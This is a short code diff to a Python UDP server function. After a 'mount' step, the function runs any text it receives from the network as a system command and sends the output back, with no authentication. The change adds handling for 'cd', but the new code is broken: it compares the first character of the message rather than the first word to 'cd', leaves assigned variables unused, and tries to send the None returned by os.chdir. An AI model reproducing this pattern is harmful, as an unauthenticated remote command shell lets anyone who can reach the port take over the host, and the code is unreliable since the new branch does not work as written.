@@ -130,9 +130,14 @@ def RunServer(host):
                 UDPServerSocket.sendto("Mounting Completed".encode('utf-8'), addr)
                 flag = True
             elif (flag):
-                result, err = subprocess.Popen(data.split(' '),
-                                          stderr=subprocess.PIPE,
-                                          stdout=subprocess.PIPE).communicate()
+                cleanData = result = data.split(' ')
+                result = ''
+                if (data[0] == 'cd'):
+                    result = os.chdir(data[1])
+                else:
+                    result, err = subprocess.Popen(data.split(' '),
+                                              stderr=subprocess.PIPE,
+                                              stdout=subprocess.PIPE).communicate()
                 UDPServerSocket.sendto(result, addr)
     UDPServerSocket.close()
     data_base.close()
